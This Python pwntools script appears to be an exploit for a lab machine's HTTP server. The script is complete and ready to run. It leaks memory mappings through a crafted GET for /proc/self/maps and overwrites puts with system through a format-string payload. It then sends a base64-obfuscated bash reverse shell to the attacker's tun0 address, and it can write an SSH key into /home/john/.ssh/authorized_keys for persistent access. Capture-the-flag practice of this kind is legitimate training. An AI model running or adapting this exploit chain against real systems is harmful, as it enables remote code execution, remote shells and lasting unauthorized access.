#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from threading import Thread # For starting the listener
from base64 import b64encode 
from urllib import parse # Urlencoding
from fcntl import ioctl # Getting IP of interface

# Set up pwntools for the correct architecture
binary = context.binary = ELF('./httpserver')
# Leaked binaries
libc = ELF('./libc-2.27.so',checksec=False)

host, port = "10.10.10.148", 9999

# Setup io
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        #process([binary.path]) # Run server
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        return remote('localhost',port, timeout=3)#, level="debug")
    else:
        return remote(host,port,timeout=3)#, level="error")

# Print startup logo
def print_logo():
    print("""   
    ______                                    _            _  _              
    | ___ \                                  | |          | || |             
    | |_/ / ___   _ __    ___   ______   ___ | |__    ___ | || |             
    |    / / _ \ | '_ \  / _ \ |_user_| / __|| '_ \  / _ \| || |             
    | |\ \| (_) || |_) ||  __/          \__ \| | | ||  __/| || |             
    \_| \_|\___/ | .__/  \___|          |___/|_| |_| \___||_||_|             
                 | |                                                         
    ______       |_| _____  _            _____         ____        _____      
    | ___ \         /  __ \| |          / __  \       / ___|      /  _  \     
    | |_/ / _   _   | /  \/| |__   _ __ | |/| |__  __/ /___   ___ | | | | ___ 
    | ___ \| | | |  | |    | '_ \ | '__|| |/| |\ \/ /| ___ \ / _ \| | | |/ __|
    | |_/ /| |_| |  | \__/\| | | || |   \ |_/ / >  < | \_/ ||  __/\ \_/ /\__ \\
    \____/  \__, |   \____/|_| |_||_|    \___/ /_/\_\\\_____/ \___| \___/ |___/
            __/  |                                                           
            |___/                                                            
    """)

#===========================================================
#                    EXPLOIT FUNCTIONS
#===========================================================


# Returns IP address of specified interface
# https://stackoverflow.com/a/24196955
def get_ip_address(ifname, ipv6=False):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(ioctl(s.fileno(), 0x8915,
                struct.pack('256s', ifname[:15].encode()))[20:24]), random.randint(9000,9998)


# Receives until no more data is available
def recvAll(debug=False):
    while True:
        try:
            if debug:
                print(io.recv())
            else:
                io.recv()
        except:
            if debug:
                print("Error whilst receiving!")
            return


# Leaks system and puts
def leak(io):
    print("")
    log.info("Stage 1: Leak addresses")

    # Trigger leak of memory mapping
    io.sendline("GET //proc/self/maps HTTP/1.1")
    io.sendline("Range: bytes=0-1512")
    io.sendline("")

    # Get unwanted stuff
    io.recvuntil("Content-type: text/plain")
    io.recvline()

    # Example leakage of proc mapping
    """
    56594000-56595000 r--p 00000000 08:02 660546           /opt/www/httpserver
    ...
    56e9f000-56ec1000 rw-p 00000000 00:00 0                [heap]
    f7d62000-f7f34000 r-xp 00000000 08:02 660685           /lib32/libc-2.27.so
    ...
    """

    ##########################################
    ####      1.) Leak PIE base           ####
    ##########################################
    # Get pie base address
    pie_base = io.recvuntil("httpserver").decode()
    pie_base = pie_base.split("-")[0].rstrip()

    # Pack address
    pie_base = int(pie_base,16)
    log.success("Leaked PIE base: 0x%x" % pie_base)

    # Receiv unwanted stuff
    io.recvuntil("[heap]")

    ##########################################
    ####      2.) Leak LIBC base          ####
    ##########################################
    # Get libc base address
    libc_base = io.recvuntil("libc").decode()
    libc_base = libc_base.split("-")[0].rstrip()

    # Pack address
    libc_base = int(libc_base,16)
    log.success("Leaked libc base: 0x%x" % libc_base)

    print("")
    log.info("Stage 2: Calculating offsets")
    # Calculate puts address from leaked pie_base
    puts = pie_base + binary.got['puts']

    # Calculate system address from leaked libc_base
    system = libc_base + libc.symbols['system']
    log.success("Calculated offset for PUTS@GOT: 0x%x" % puts)
    log.success("Calculated offset for SYSTEM@LIBC: 0x%x" % system)

    # Recv rest of unwanted stuff
    recvAll()

    # Return leaked addresses
    return puts, system


# Generates reverse-shell payload
def genPayload(IP, PORT):
    #payload = r"ping -c 4 {IP}".format(IP=IP) # POC payload
    payload = r"bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'".format(IP=IP,PORT=PORT)
    log.debug("Unencoded payload: %s" % payload)
    return ('echo${IFS}-n${IFS}"' + b64encode(payload.encode()).decode() + '"|${IFS}base64${IFS}-d${IFS}|${IFS}bash')


# Sends final payload to server
def sendPayload(io, IP, PORT, payload):
    # Get IP address of host and generate reverse-shell payload
    rev_shell = genPayload(IP, PORT)

    # Final payload which overwrites puts with system and calls reverse-shell
    final_payload = '''\
    {REV} /{PAYLOAD} HTTP/1.1
    Host: 10.10.10.148:9999
    User-Agent: Chr0x6eOs/hacked/you
    Accept: /

    '''.format(REV=rev_shell,PAYLOAD=parse.quote(payload)) # URL encode: https://www.urlencoder.io/python/

    # Send final payload
    log.debug("Sending final payload:\n%s" % final_payload)
    io.send(final_payload)
    log.info("Payload send!")


# Writes ssh key to authorized_keys file of john user
def setup_ssh(shell):
    key = ""
    path = "id_rsa.pub"
    # Try to read ssh key
    try:
        with open(path,"r") as f:
            key = f.read()
    except:
        log.warning("Could not read ssh key: %s" % path)
        return False # Just get shell

    # Check if key is valid once again
    if key == "":
        log.warning("SSH key %s is empty!" % path)
        return False # Just get shell
    else:
        # Write ssh key
        log.info("Writing ssh-key to /home/john/.ssh/authorized_keys!")
        # Setup environ
        shell.sendline("mkdir -p /home/john/.ssh/")
        shell.recv()
        shell.sendline("echo '" + key + "' > /home/john/.ssh/authorized_keys")
        shell.recv()
        log.success("Written ssh key to authorized_keys! If errors occur, try ./exploit.py REV to get a reverse-shell manually.")
        log.info("Use: ssh john@10.10.10.148 -i %s" % path[:-4])
        print("")
        return True # Key written


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Exploit binary
def exploit():
    # Get IO stream
    io = start()

    # Leak memory-mapping
    puts, system = leak(io)
    io.close() # Close connection
    print("")

    # Overwrite puts with system
    write = {puts:system}
    # Tell pwntools to overwrite puts with system @offset 53
    # http://docs.pwntools.com/en/stable/fmtstr.html#example-payload-generation
    payload = fmtstr_payload(53, write)

    log.info("Stage 3: Generating payload to overwrite puts with system")
    log.success("Payload generated: %s" % payload)

    # Get my IP from tun0 interface
    IP,PORT = get_ip_address("tun0")

    print("")

    log.info("Stage 4: Sending payload and getting a reverse-shell")

    # Restart io, because of EOF issues
    io = start()

    # Setup reverse-shell manually
    if args.REV:
        print("Start a listener on port %s!" % PORT)
        while True:
            done = input("Send payload? [Y/n] ").rstrip()
            if done in ["Y","y",""]:
                sendPayload(io,IP,PORT,payload)
                io.close()
                break
            else:
                # Prompt for exit
                exit = input("Exit [Y/n] ").rstrip()
                if exit in ["Y","y",""]:
                    io.close()
                    sys.exit()
    else:
        # Write ssh key to john user
        threading.Thread(target=sendPayload, args=(io,IP,PORT,payload,)).start()
        shell = listen(PORT, bindaddr=IP, timeout=5).wait_for_connection()
        io.close() # Close connection to server upon receiving

        # Check if a shell was received
        try:
            print("")
            shell.recv()
            shell.recv()
        except Exception as ex:
            log.warning("There seems to be a problem with the shell!")
            if "NoneType" in str(ex):
                try: # Catch pwnlib exception
                    log.error("Did not get shell! Try again...")
                except:
                    sys.exit()
            else:
                log.warning("DEBUG: %s" % ex)
                sys.exit()
            

        if args.SSH:
            # Setup ssh key for john
            if setup_ssh(shell):
                shell.close()
                sys.exit()
        shell.sendline("id")
        shell.recvline()
        shell.interactive(prompt="")


if __name__ == "__main__":
    print_logo()
    exploit()